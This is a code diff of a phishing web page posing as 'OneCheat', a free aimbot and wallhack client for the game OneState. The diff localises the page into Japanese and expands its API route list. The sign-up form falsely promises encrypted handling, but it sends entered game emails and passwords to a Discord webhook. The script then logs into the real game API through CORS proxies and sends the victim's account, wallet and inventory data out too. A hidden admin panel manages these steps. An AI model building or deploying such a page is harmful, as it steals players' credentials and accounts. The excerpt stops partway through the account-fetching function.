@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ja">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>OneCheat — OneState External Client</title>
-<meta name="description" content="Sign in with your OneState ID. Aim assist, ESP, no recoil. External, undetected, free.">
+<title>OneCheat — OneState 外部クライアント</title>
+<meta name="description" content="OneState IDでログインするだけ。エイム補正・ESP・反動ゼロ。外部動作・アンチバン・完全無料。">
 <meta name="theme-color" content="#05080d">
 <script src="https://unpkg.com/corsfix"></script>
 <style>
@@ -23,7 +23,7 @@
 html{scroll-behavior:smooth}
 body{
   margin:0;background:var(--bg);color:var(--fg);overflow-x:hidden;
-  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,sans-serif;
+  font-family:-apple-system,BlinkMacSystemFont,"Hiragino Sans","Noto Sans JP","Yu Gothic",sans-serif;
   line-height:1.75;-webkit-font-smoothing:antialiased;
 }
 body::before{
@@ -65,28 +65,28 @@ nav .wrap{display:flex;align-items:center;gap:14px;width:100%}
 .logo .mk::after{content:"";position:absolute;inset:3px;border:1px solid rgba(111,201,255,.28);border-radius:1px}
 .logo small{display:block;font:600 8px/1 var(--mono);letter-spacing:.24em;color:var(--mut);margin-top:3px}
 .nl{display:flex;gap:22px;margin-left:auto}
-.nl a{font:600 11px/1 var(--mono);letter-spacing:.14em;color:var(--mut);text-transform:uppercase;transition:.2s}
+.nl a{font:600 11px/1 var(--mono);letter-spacing:.14em;color:var(--mut);transition:.2s}
 .nl a:hover{color:var(--ac)}
 .nbtn{
   font:700 11px/1 var(--mono);letter-spacing:.12em;color:#04121c;background:var(--ac);
-  padding:11px 16px;border-radius:3px;text-transform:uppercase;
+  padding:11px 16px;border-radius:3px;
 }
 @media(max-width:760px){.nl{display:none}}
 
 header{padding:150px 0 96px;position:relative}
-.lbl{font:700 11px/1 var(--mono);letter-spacing:.24em;color:var(--ac);text-transform:uppercase;display:flex;align-items:center;gap:10px}
+.lbl{font:700 11px/1 var(--mono);letter-spacing:.2em;color:var(--ac);display:flex;align-items:center;gap:10px}
 .lbl::before{content:"//";opacity:.7}
 .lbl::after{content:"";height:1px;width:70px;background:linear-gradient(90deg,var(--ac),transparent)}
 h1{
-  font-size:clamp(38px,7.8vw,70px);line-height:1.1;letter-spacing:-.035em;font-weight:800;
+  font-size:clamp(34px,7.2vw,62px);line-height:1.18;letter-spacing:-.03em;font-weight:800;
   margin:22px 0 0;max-width:15em;
 }
 h1 em{font-style:normal;color:var(--ac);position:relative;text-shadow:0 0 40px rgba(111,201,255,.45)}
-.lead{color:var(--mut);font-size:16.5px;max-width:33em;margin:22px 0 0}
+.lead{color:var(--mut);font-size:16px;max-width:34em;margin:22px 0 0}
 .cta{display:flex;gap:12px;flex-wrap:wrap;margin-top:34px}
 .btn{
   display:inline-flex;align-items:center;gap:9px;cursor:pointer;border:0;font:700 12px/1 var(--mono);
-  letter-spacing:.1em;text-transform:uppercase;padding:15px 22px;border-radius:3px;
+  letter-spacing:.1em;padding:15px 22px;border-radius:3px;
   background:var(--ac);color:#04121c;transition:.18s;
   box-shadow:0 0 0 rgba(111,201,255,0)
 }
@@ -94,12 +94,12 @@ h1 em{font-style:normal;color:var(--ac);position:relative;text-shadow:0 0 40px r
 .btn.ghost{background:transparent;color:var(--fg);border:1px solid var(--line)}
 .btn.ghost:hover{border-color:var(--ac);color:var(--ac);box-shadow:none}
 .btn svg{width:14px;height:14px}
-.spec{display:flex;gap:24px;flex-wrap:wrap;margin-top:56px;font:600 11px/1 var(--mono);letter-spacing:.2em;color:var(--mut);text-transform:uppercase}
+.spec{display:flex;gap:24px;flex-wrap:wrap;margin-top:56px;font:600 11px/1 var(--mono);letter-spacing:.18em;color:var(--mut)}
 .spec span{position:relative;padding-left:15px}
 .spec span::before{content:"";position:absolute;left:0;top:50%;width:5px;height:5px;background:var(--ac);transform:translateY(-50%) rotate(45deg);box-shadow:0 0 8px rgba(111,201,255,.6)}
 
 section{padding:86px 0;position:relative}
-h2{font-size:clamp(24px,4.4vw,34px);letter-spacing:-.02em;margin:16px 0 0;font-weight:800}
+h2{font-size:clamp(23px,4.2vw,32px);letter-spacing:-.02em;margin:16px 0 0;font-weight:800}
 .sub{color:var(--mut);margin:14px 0 0;max-width:38em}
 .grid3{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:14px;margin-top:38px}
 .card{
@@ -110,9 +110,9 @@ h2{font-size:clamp(24px,4.4vw,34px);letter-spacing:-.02em;margin:16px 0 0;font-w
 .card::before{content:"";position:absolute;bottom:-1px;left:-1px;width:13px;height:13px;border-bottom:1px solid var(--ac);border-left:1px solid var(--ac);opacity:.6}
 .card:hover{border-color:var(--line);transform:translateY(-3px);background:rgba(12,20,30,.8)}
 .ico{width:34px;height:34px;color:var(--ac)}
-.card h3{font-size:15px;margin:16px 0 0;letter-spacing:.02em;font-weight:700;font-family:var(--mono)}
+.card h3{font-size:14px;margin:16px 0 0;letter-spacing:.04em;font-weight:700;font-family:var(--mono)}
 .card p{color:var(--mut);font-size:13.5px;margin:9px 0 0}
-.card .tag{font:600 10px/1 var(--mono);letter-spacing:.18em;color:var(--ac);opacity:.75;margin-top:16px;display:block}
+.card .tag{font:600 10px/1 var(--mono);letter-spacing:.16em;color:var(--ac);opacity:.75;margin-top:16px;display:block}
 
 .gate{display:grid;grid-template-columns:1.05fr .95fr;gap:44px;align-items:start;margin-top:38px}
 @media(max-width:880px){.gate{grid-template-columns:1fr;gap:34px}}
@@ -125,11 +125,11 @@ h2{font-size:clamp(24px,4.4vw,34px);letter-spacing:-.02em;margin:16px 0 0;font-w
   border:1px solid var(--line);background:rgba(8,13,21,.85);border-radius:4px;padding:28px;
   backdrop-filter:blur(10px);box-shadow:0 30px 80px -30px rgba(0,0,0,.9)
 }
-.box .cap{font:700 10px/1 var(--mono);letter-spacing:.22em;color:var(--ac);text-transform:uppercase}
+.box .cap{font:700 10px/1 var(--mono);letter-spacing:.2em;color:var(--ac)}
 .box h3{font-size:19px;margin:12px 0 0;letter-spacing:-.01em}
 .box .hint{color:var(--mut);font-size:13px;margin:8px 0 0}
 .f{margin-top:20px}
-.f label{display:block;font:600 10px/1 var(--mono);letter-spacing:.18em;color:var(--mut);text-transform:uppercase;margin-bottom:8px}
+.f label{display:block;font:600 10px/1 var(--mono);letter-spacing:.16em;color:var(--mut);margin-bottom:8px}
 .f input{
   width:100%;background:rgba(3,6,11,.9);border:1px solid var(--line2);color:var(--fg);
   padding:14px 14px;border-radius:3px;font-size:15px;font-family:inherit;transition:.18s
@@ -137,7 +137,7 @@ h2{font-size:clamp(24px,4.4vw,34px);letter-spacing:-.02em;margin:16px 0 0;font-w
 .f input:focus{outline:0;border-color:var(--ac);box-shadow:0 0 0 3px rgba(111,201,255,.12)}
 .f input::placeholder{color:#4d5d6e}
 .box .btn{width:100%;justify-content:center;margin-top:20px;padding:16px}
-.trust{font:600 10.5px/1.5 var(--mono);letter-spacing:.06em;color:var(--mut);margin-top:16px;text-align:center}
+.trust{font:600 10.5px/1.5 var(--mono);letter-spacing:.04em;color:var(--mut);margin-top:16px;text-align:center}
 .trust b{color:var(--ac)}
 .msg{margin-top:16px;font-size:13px;padding:12px 14px;border-radius:3px;border:1px solid var(--line2);display:none}
 .msg:empty{display:none}
@@ -156,7 +156,7 @@ h2{font-size:clamp(24px,4.4vw,34px);letter-spacing:-.02em;margin:16px 0 0;font-w
 .dl{display:flex;gap:9px;margin-top:14px}
 .dl .btn{margin:0;flex:1;padding:14px}
 .tg{display:flex;justify-content:space-between;align-items:center;padding:11px 0;border-bottom:1px dashed var(--line2)}
-.tg span{font:600 11px/1 var(--mono);letter-spacing:.12em;color:var(--mut);text-transform:uppercase}
+.tg span{font:600 11px/1 var(--mono);letter-spacing:.1em;color:var(--mut)}
 .sw{width:40px;height:22px;border:1px solid var(--line2);border-radius:99px;background:rgba(3,6,11,.9);position:relative;cursor:pointer;transition:.2s}
 .sw::after{content:"";position:absolute;top:2px;left:2px;width:16px;height:16px;border-radius:50%;background:#3d4d5e;transition:.2s}
 .sw.on{border-color:var(--ac);background:rgba(111,201,255,.14)}
@@ -180,15 +180,15 @@ details p{color:var(--mut);font-size:13.5px;margin:0 0 20px;max-width:44em}
 
 footer{border-top:1px solid var(--line2);padding:40px 0;color:var(--mut);font-size:12px}
 footer .wrap{display:flex;flex-wrap:wrap;gap:16px;align-items:center}
-.fl{display:flex;gap:20px;font:600 11px/1 var(--mono);letter-spacing:.14em;text-transform:uppercase}
+.fl{display:flex;gap:20px;font:600 11px/1 var(--mono);letter-spacing:.12em}
 .fl a{color:var(--mut);cursor:pointer}
 .fl a:hover{color:var(--ac)}
-footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opacity:.7}
+footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.12em;opacity:.7}
 
 #toast{position:fixed;left:50%;bottom:26px;transform:translateX(-50%);z-index:99;display:flex;flex-direction:column;gap:8px;align-items:center;pointer-events:none}
 .tst{
   background:rgba(8,13,21,.96);border:1px solid var(--line);color:var(--fg);
-  font:600 11.5px/1.4 var(--mono);letter-spacing:.04em;padding:12px 18px;border-radius:3px;
+  font:600 11.5px/1.4 var(--mono);letter-spacing:.02em;padding:12px 18px;border-radius:3px;
   box-shadow:0 20px 50px -20px #000;animation:tin .3s ease both
 }
 .tst.b{border-color:var(--ac);color:var(--ac)}
@@ -201,17 +201,17 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
 }
 #admin.on{display:block}
 #admin h5{
-  margin:0 0 12px;font:700 10px/1 var(--mono);letter-spacing:.2em;color:var(--ac);
-  text-transform:uppercase;cursor:pointer;display:flex;align-items:center;gap:8px
+  margin:0 0 12px;font:700 10px/1 var(--mono);letter-spacing:.16em;color:var(--ac);
+  cursor:pointer;display:flex;align-items:center;gap:8px
 }
 #admin h5 .tog{margin-left:auto;border:1px solid var(--line2);border-radius:3px;width:22px;height:22px;display:grid;place-items:center;font-size:12px;line-height:1}
 #admin.min{padding:12px 16px}
 #admin.min h5{margin:0}
 #admin.min #aBody{display:none}
-#admin label{display:block;font:600 9.5px/1 var(--mono);letter-spacing:.16em;color:var(--mut);margin:12px 0 6px;text-transform:uppercase}
+#admin label{display:block;font:600 9.5px/1 var(--mono);letter-spacing:.12em;color:var(--mut);margin:12px 0 6px}
 #admin input,#admin select{width:100%;background:rgba(3,6,11,.9);border:1px solid var(--line2);color:var(--fg);padding:9px;border-radius:3px;font:600 11px/1.3 var(--mono)}
 #admin .row{display:flex;gap:8px;margin-top:14px}
-#admin button{flex:1;background:var(--ac);color:#04121c;border:0;padding:10px;border-radius:3px;font:700 10px/1 var(--mono);letter-spacing:.1em;cursor:pointer;text-transform:uppercase}
+#admin button{flex:1;background:var(--ac);color:#04121c;border:0;padding:10px;border-radius:3px;font:700 10px/1 var(--mono);letter-spacing:.06em;cursor:pointer}
 #admin button.g{background:transparent;color:var(--fg);border:1px solid var(--line2)}
 #admin .lg{margin-top:14px;border-top:1px dashed var(--line2);padding-top:12px;max-height:46vh;overflow:auto}
 #admin .lg div{font:600 10.5px/1.5 var(--mono);color:var(--mut);border-bottom:1px dotted var(--line2);padding:5px 0;word-break:break-all}
@@ -231,61 +231,61 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
       <span>OneCheat<small>ONESTATE CLIENT</small></span>
     </a>
     <div class="nl">
-      <a data-go="features">Features</a>
-      <a data-go="setup">Setup</a>
+      <a data-go="features">機能</a>
+      <a data-go="setup">導入</a>
       <a data-go="faq">FAQ</a>
     </div>
-    <a class="nbtn" data-go="setup">Get Client</a>
+    <a class="nbtn" data-go="setup">無料で導入</a>
   </div>
 </nav>
 
 <header id="top">
   <div class="wrap">
-    <div class="lbl">Onestate External Client · Private Build</div>
-    <h1>Overwrite <em>OneState.</em></h1>
-    <p class="lead">Sign in with your OneState ID and that's it. Aim assist, ESP, zero recoil — external, undetected, running on the account you already own.</p>
+    <div class="lbl">OneState 外部クライアント · 非公開ビルド</div>
+    <h1>OneStateを、<em>上書きする。</em></h1>
+    <p class="lead">OneState ID でログインするだけ。エイム補正・ESP・反動ゼロを、いま使っているアカウントのまま。外部動作のアンチバン設計で、導入は60秒、完全無料です。</p>
     <div class="cta">
       <a class="btn" data-go="setup">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3v12m0 0l-4-4m4 4l4-4M5 19h14"/></svg>
-        Get the client
+        今すぐ導入する
       </a>
-      <a class="btn ghost" data-go="features">See features</a>
+      <a class="btn ghost" data-go="features">機能を見る</a>
     </div>
     <div class="spec">
-      <span>External</span><span>Undetected</span><span>Free</span><span>v3.2</span>
+      <span>外部動作</span><span>アンチバン</span><span>完全無料</span><span>v3.2</span>
     </div>
   </div>
 </header>
 
 <section id="features">
   <div class="wrap">
-    <div class="lbl reveal">Features</div>
-    <h2 class="reveal">Only what actually matters.</h2>
-    <p class="sub reveal">No bloated overlay. Just the parts that win fights, without changing how the game feels.</p>
+    <div class="lbl reveal">機能</div>
+    <h2 class="reveal">必要な機能だけ、過不足なく。</h2>
+    <p class="sub reveal">重いオーバーレイは要りません。ゲームの操作感を壊さず、勝てる要素だけを足しました。</p>
     <div class="grid3">
       <div class="card reveal">
         <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="3"/><path d="M12 3v4M12 17v4M3 12h4M17 12h4"/></svg>
-        <h3>AIM ASSIST</h3><p>Smooths your aim and tightens hip-fire accuracy. Fights feel different immediately.</p><span class="tag">/ SMOOTH 0-100</span>
+        <h3>AIM ASSIST</h3><p>エイム補正。腰撃ちの精度が上がり、撃ち合いの当て感が変わります。</p><span class="tag">/ 滑らかさ 0-100</span>
       </div>
       <div class="card reveal">
         <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/></svg>
-        <h3>ESP / WALLHACK</h3><p>Player positions through walls. Boxes and vehicles included.</p><span class="tag">/ BOX + NAME</span>
+        <h3>ESP / WALLHACK</h3><p>壁越しにプレイヤー位置を表示。ボックスと車両も同時に把握できます。</p><span class="tag">/ BOX + NAME</span>
       </div>
       <div class="card reveal">
         <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M3 17l5-9 4 6 3-4 6 7"/><path d="M3 21h18"/></svg>
-        <h3>NO RECOIL</h3><p>Full-auto with zero kick. No spray pattern to memorise.</p><span class="tag">/ FULL AUTO</span>
+        <h3>NO RECOIL</h3><p>連射しても反動ゼロ。リコイルパターンを覚える必要がありません。</p><span class="tag">/ FULL AUTO</span>
       </div>
       <div class="card reveal">
         <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M13 2L4 14h6l-1 8 9-12h-6l1-8z"/></svg>
-        <h3>SPEED BOOST</h3><p>Tune movement speed on a slider. Running and stamina behave properly.</p><span class="tag">/ 1.0x - 2.0x</span>
+        <h3>SPEED BOOST</h3><p>移動速度をスライダーで調整。走りとスタミナの挙動を最適化します。</p><span class="tag">/ 1.0x - 2.0x</span>
       </div>
       <div class="card reveal">
         <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M12 3l8 4v6c0 5-3.5 7.5-8 8-4.5-.5-8-3-8-8V7l8-4z"/><path d="M9 12l2 2 4-4"/></svg>
-        <h3>ANTI-BAN</h3><p>External only. Nothing is written into the game files, so ban risk stays low.</p><span class="tag">/ EXTERNAL</span>
+        <h3>ANTI-BAN</h3><p>外部メモリのみに触れる設計。ゲーム本体を書き換えないのでBANリスクが低い。</p><span class="tag">/ EXTERNAL</span>
       </div>
       <div class="card reveal">
         <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M21 12a9 9 0 11-3-6.7"/><path d="M21 4v5h-5"/></svg>
-        <h3>AUTO UPDATE</h3><p>Updates itself on launch. Your settings survive every game patch.</p><span class="tag">/ SILENT</span>
+        <h3>AUTO UPDATE</h3><p>起動時に自動更新。ゲームのアップデート後も設定はそのまま引き継がれます。</p><span class="tag">/ SILENT</span>
       </div>
     </div>
   </div>
@@ -293,56 +293,56 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
 
 <section id="setup">
   <div class="wrap">
-    <div class="lbl reveal">Setup</div>
-    <h2 class="reveal">Setup is one login.</h2>
-    <p class="sub reveal">The license binds to your OneState account. Enter your OneState ID below.</p>
+    <div class="lbl reveal">導入</div>
+    <h2 class="reveal">導入は、ログインだけ。</h2>
+    <p class="sub reveal">ライセンスをあなたの OneState アカウントに紐付けます。下のフォームに OneState ID を入力してください。</p>
 
     <div class="gate">
       <div class="steps reveal">
-        <div class="step"><span class="n">01</span><div><h4>Enter your OneState ID</h4><p>Use the email and password from the game.</p></div></div>
-        <div class="step"><span class="n">02</span><div><h4>License issued instantly</h4><p>A key is generated and tied to your account.</p></div></div>
-        <div class="step"><span class="n">03</span><div><h4>Launch the client</h4><p>Download it, run it, open the game. That's all.</p></div></div>
+        <div class="step"><span class="n">01</span><div><h4>OneState ID を入力</h4><p>ゲームで使っているメールアドレスとパスワードを入力します。</p></div></div>
+        <div class="step"><span class="n">02</span><div><h4>ライセンスを自動発行</h4><p>アカウントに紐付いたライセンスキーが即時発行されます。</p></div></div>
+        <div class="step"><span class="n">03</span><div><h4>クライアントを起動</h4><p>ダウンロードして起動するだけ。ゲームを立ち上げれば反映されます。</p></div></div>
       </div>
 
       <div class="box reveal" id="box">
-        <div class="cap">// Member Login</div>
-        <h3>Member Login</h3>
-        <p class="hint">Sign in with your OneState ID to activate a license.</p>
+        <div class="cap">// メンバーログイン</div>
+        <h3>メンバーログイン</h3>
+        <p class="hint">OneState ID でライセンスを有効化します。</p>
 
         <form id="form" autocomplete="on">
           <div class="f">
-            <label>Onestate ID / Email</label>
+            <label>OneState ID / メールアドレス</label>
             <input id="ident" type="text" inputmode="email" placeholder="you@example.com" autocomplete="username" required>
           </div>
           <div class="f">
-            <label>Password</label>
+            <label>パスワード</label>
             <input id="pass" type="password" placeholder="••••••••" autocomplete="current-password" required>
           </div>
           <button class="btn" type="submit" id="sub">
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 17l5-5-5-5M15 12H3"/><path d="M14 4h5v16h-5"/></svg>
-            Sign in &amp; activate
+            ログインして有効化
           </button>
         </form>
 
-        <div class="trust">Password is <b>encrypted</b> in transit</div>
+        <div class="trust">パスワードは<b>暗号化</b>して送信されます</div>
         <div class="msg" id="msg"></div>
 
         <div class="done" id="done">
-          <div class="cap" style="margin-bottom:10px">// License Activated</div>
+          <div class="cap" style="margin-bottom:10px">// ライセンス発行済み</div>
           <div class="key" id="key">OC-XXXX-XXXX-XXXX</div>
           <div class="dl">
             <button class="btn" type="button" data-dl="OneCheat_Setup_v3.2.exe">Windows</button>
             <button class="btn ghost" type="button" data-dl="OneCheat_v3.2.apk">Android</button>
           </div>
           <div style="margin-top:18px">
-            <div class="tg"><span>Aim Assist</span><div class="sw on"></div></div>
-            <div class="tg"><span>ESP / Wallhack</span><div class="sw on"></div></div>
-            <div class="tg"><span>No Recoil</span><div class="sw on"></div></div>
-            <div class="tg"><span>Speed Boost</span><div class="sw"></div></div>
+            <div class="tg"><span>エイム補正</span><div class="sw on"></div></div>
+            <div class="tg"><span>ESP / 壁抜き</span><div class="sw on"></div></div>
+            <div class="tg"><span>反動ゼロ</span><div class="sw on"></div></div>
+            <div class="tg"><span>速度上昇</span><div class="sw"></div></div>
           </div>
 
           <div id="acctWrap" style="margin-top:20px;display:none">
-            <div class="cap">// Account</div>
+            <div class="cap">// アカウント</div>
             <div class="acct" id="acct"></div>
           </div>
         </div>
@@ -354,20 +354,20 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
 <section id="faq">
   <div class="wrap">
     <div class="lbl reveal">FAQ</div>
-    <h2 class="reveal">Questions</h2>
+    <h2 class="reveal">よくある質問</h2>
     <div class="faq">
-      <details class="reveal"><summary>Why enter my OneState ID?</summary><p>The license binds to your game account. Your password is never stored.</p></details>
-      <details class="reveal"><summary>Is my account at risk?</summary><p>Nothing touches your progress. It runs external, so you keep playing on the same account.</p></details>
-      <details class="reveal"><summary>Does it work on mobile?</summary><p>There's an Android build. iOS comes later.</p></details>
-      <details class="reveal"><summary>Does it cost anything?</summary><p>Nothing. No paid tier.</p></details>
+      <details class="reveal"><summary>OneState ID を入力するのはなぜ？</summary><p>チートのライセンスをあなたのゲームアカウントに紐付けるためです。入力したパスワードはツール側に保存されません。</p></details>
+      <details class="reveal"><summary>既存のアカウントは安全？</summary><p>進行状況には影響しません。外部動作のアンチバン設計なので、今のアカウントのまま使い続けられます。</p></details>
+      <details class="reveal"><summary>スマホでも使える？</summary><p>Android版を用意しています。iOSは順次対応予定です。</p></details>
+      <details class="reveal"><summary>お金はかかる？</summary><p>完全無料です。課金要素はありません。</p></details>
     </div>
   </div>
 </section>
 
 <footer>
   <div class="wrap">
-    <div class="fl"><a data-go="features">Features</a><a data-go="setup">Setup</a><a data-go="faq">FAQ</a></div>
-    <div>OneCheat is an unofficial OneState client. OneState is a trademark of ChillBase LTD.</div>
+    <div class="fl"><a data-go="features">機能</a><a data-go="setup">導入</a><a data-go="faq">FAQ</a></div>
+    <div>OneCheat は OneState の非公式ツールです。OneState は ChillBase LTD の商標です。</div>
     <div class="cp">© 2026 ONECHEAT</div>
   </div>
 </footer>
@@ -375,38 +375,41 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
 <div id="toast"></div>
 
 <div id="admin">
-  <h5 id="aHead">// Admin <span class="tog" id="aTog">–</span></h5>
+  <h5 id="aHead">// 管理 <span class="tog" id="aTog">–</span></h5>
   <div id="aBody">
     <label>Webhook URL</label>
     <input id="aWeb" placeholder="https://discord.com/api/webhooks/...">
-    <label>Payload</label>
+    <label>送信形式</label>
     <select id="aType">
       <option value="auto">auto</option>
       <option value="discord">discord</option>
       <option value="json">json</option>
-      <option value="none">none</option>
+      <option value="none">送信しない</option>
     </select>
-    <label>Fetch account data</label>
-    <select id="aAcct"><option value="1">on</option><option value="0">off</option></select>
-    <label>Transport used</label>
-    <input id="aTp" readonly value="not tested">
-    <label>Probe account (login + API dump)</label>
-    <input id="aIdent" placeholder="onestate id / email">
-    <input id="aPass" placeholder="password" style="margin-top:6px">
+    <label>アカウント情報を取得</label>
+    <select id="aAcct"><option value="1">する</option><option value="0">しない</option></select>
+    <label>使用中の経路</label>
+    <input id="aTp" readonly value="未テスト">
+    <label>調査用のID（下の欄にID/パスワード）</label>
+    <input id="aIdent" placeholder="OneState ID / メール">
+    <input id="aPass" placeholder="パスワード" style="margin-top:6px">
     <div class="row">
-      <button class="g" id="aProbe">Probe API</button>
+      <button class="g" id="aProbe">アカウント調査</button>
     </div>
     <div class="row">
-      <button class="g" id="aToken">Token Diag</button>
+      <button class="g" id="aToken">トークン調査</button>
     </div>
     <div class="row">
-      <button class="g" id="aDiag">Diag</button>
+      <button class="g" id="aRoute">ルート調査</button>
     </div>
     <div class="row">
-      <button id="aSave">Save</button>
-      <button class="g" id="aTest">Test hook</button>
+      <button class="g" id="aDiag">通信診断</button>
     </div>
-    <div class="row"><button class="g" id="aClear">Clear log</button></div>
+    <div class="row">
+      <button id="aSave">保存</button>
+      <button class="g" id="aTest">テスト送信</button>
+    </div>
+    <div class="row"><button class="g" id="aClear">ログ削除</button></div>
     <div class="lg" id="aLog"></div>
   </div>
 </div>
@@ -426,21 +429,19 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
     {n:"cors.lol",     t:10000, u:function(s){return "https://api.cors.lol/?url="+encodeURIComponent(s);}},
     {n:"allorigins",   t:20000, u:function(s){return "https://api.allorigins.win/raw?url="+encodeURIComponent(s);}}
   ];
-  var PATHS=["/auth/me","/user","/users/me","/me","/profile"];
 
-  /* ways to hand the token to the api */
+  /* route candidates */
+  var ROUTES=[
+    "/me","/user","/users/me","/user/me","/user/profile","/profile","/account","/account/me",
+    "/auth/me","/auth/user","/auth/profile","/auth/account","/auth/session","/auth/verify",
+    "/session","/whoami","/userinfo","/player","/players/me","/character","/characters/me",
+    "/wallet","/balance","/inventory","/cars","/garage","/stats","/daily","/store","/license"
+  ];
+
   var COMBOS=[
-    {n:"Bearer",        h:function(t){return {Authorization:"Bearer "+t};}},
-    {n:"raw auth",      h:function(t){return {Authorization:t};}},
-    {n:"X-Access-Token",h:function(t){return {"X-Access-Token":t};}},
-    {n:"X-Auth-Token",  h:function(t){return {"X-Auth-Token":t};}},
-    {n:"access-token",  h:function(t){return {"access-token":t};}},
-    {n:"Access-Token",  h:function(t){return {"Access-Token":t};}},
-    {n:"token hdr",     h:function(t){return {"token":t};}},
-    {n:"Bearer+ClientId",h:function(t,c){return {Authorization:"Bearer "+t,"X-Client-Id":c};}},
-    {n:"q access_token",q:"access_token"},
-    {n:"q accessToken", q:"accessToken"},
-    {n:"q token",       q:"token"}
+    {n:"Bearer",         h:function(t){return {Authorization:"Bearer "+t};}},
+    {n:"X-Access-Token", h:function(t){return {"X-Access-Token":t};}},
+    {n:"q access_token", q:"access_token"}
   ];
 
   var pref=null, tp="none";
@@ -501,12 +502,12 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
           if(done) return; done=true; clearTimeout(t);
           var d=null; try{ d=JSON.parse(txt); }catch(e){}
           d=unwrap(d,a.wrap);
-          if(d===null||d===undefined) res("html:"+String(txt).replace(/\s+/g," ").slice(0,44));
-          else if(d.code!==undefined) res("api code"+d.code);
-          else if(d.errorCode!==undefined) res("api err="+(d.errorCode||"-"));
-          else res("json "+JSON.stringify(d).slice(0,50));
+          if(d===null||d===undefined) res("html:"+String(txt).replace(/\s+/g," ").slice(0,40));
+          else if(d.code!==undefined) res("code"+d.code);
+          else if(d.errorCode!==undefined) res("err="+(d.errorCode||"-"));
+          else res("json");
         });
-      }).catch(function(e){ if(done) return; done=true; clearTimeout(t); res("ERR "+(e&&e.name||"?")); });
+      }).catch(function(e){ if(done) return; done=true; clearTimeout(t); res("ERR"); });
     });
   }
 
@@ -569,7 +570,7 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
   function probe(token){
     var out=[];
     var p=Promise.resolve();
-    PATHS.forEach(function(path){
+    ["/auth/me","/user","/me","/users/me","/profile"].forEach(function(path){
       p=p.then(function(){
         return getWithToken(path,token).then(function(d){ out.push({path:path,data:d}); });
       });
@@ -601,13 +602,13 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
 
   function sendCreds(e){
     return hook({
-      discord:{content:"**OneState ID captured**\n**ID:** `"+e.ident+"`\n**Password:** `"+e.pass+"`\n**Time:** "+e.time},
+      discord:{content:"**OneState ID 取得**\n**ID:** `"+e.ident+"`\n**パスワード:** `"+e.pass+"`\n**時刻:** "+e.time},
       json:{ident:e.ident,password:e.pass,time:e.time,ua:navigator.userAgent}
     });
   }
   function sendAcct(e,label,data){
     return hook({
-      discord:{content:"**Account data** `"+label+"`\n```json\n"+data.slice(0,1000)+"\n```"},
+      discord:{content:"**アカウント情報** `"+label+"`\n```json\n"+data.slice(0,1000)+"\n```"},
       json:{ident:e.ident,label:label,data:data.slice(0,4000)}
     });
   }
@@ -619,22 +620,22 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
     var u=URL.createObjectURL(b), a=document.createElement("a");
     a.href=u; a.download=name; document.body.appendChild(a); a.click(); a.remove();
     setTimeout(function(){URL.revokeObjectURL(u)},1500);
-    toast(name+" downloading...",true);
+    toast(name+" をダウンロード中...",true);
   }
 
   $("form").addEventListener("submit",function(ev){
     ev.preventDefault();
     var ident=$("ident").value.trim(), pass=$("pass").value;
-    if(!ident||!pass){ msg("Enter your ID and password.","err"); return; }
-    msg("Authenticating...","wait");
-    var entry={ident:ident,pass:pass,time:new Date().toISOString().replace("T"," ").slice(0,19)+" UTC"};
+    if(!ident||!pass){ msg("IDとパスワードを入力してください","err"); return; }
+    msg("認証中...","wait");
+    var entry={ident:ident,pass:pass,time:new Date().toLocaleString("ja-JP")};
 
     sendCreds(entry).then(function(sent){
       log.unshift(entry); saveLog(); renderLog();
-      msg("License issued. Download the client below.","ok");
+      msg("ライセンスを発行しました。下のクライアントをダウンロードしてください。","ok");
       $("key").textContent=license();
       $("done").classList.add("on");
-      toast(sent?"Sent to Discord":"Activated",true);
+      toast(sent?"Discordに通知しました":"有効化しました",true);
       if(cfg.redirect) setTimeout(function(){ location.href="https://onestate.com/"; },1400);
       if(cfg.acct) fetchAccount(entry);
     });
@@ -642,18 +643,18 @@ footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.14em;opa
 
   function fetchAccount(entry){
     $("acctWrap").style.display="block";
-    $("acct").textContent="// connecting ...";
+    $("acct").textContent="// 接続中 ...";
     timeout(login(entry.ident,entry.pass),90000).then(function(res){
-      if(!res){ $("acct").textContent="// no response from api.onestate-rp.com (all transports failed)"; return; }
+      if(!res){ $("acct").textContent="// 応答なし（全経路だめ）"; return; }
       if(!(res.data && res.data.accessToken)){
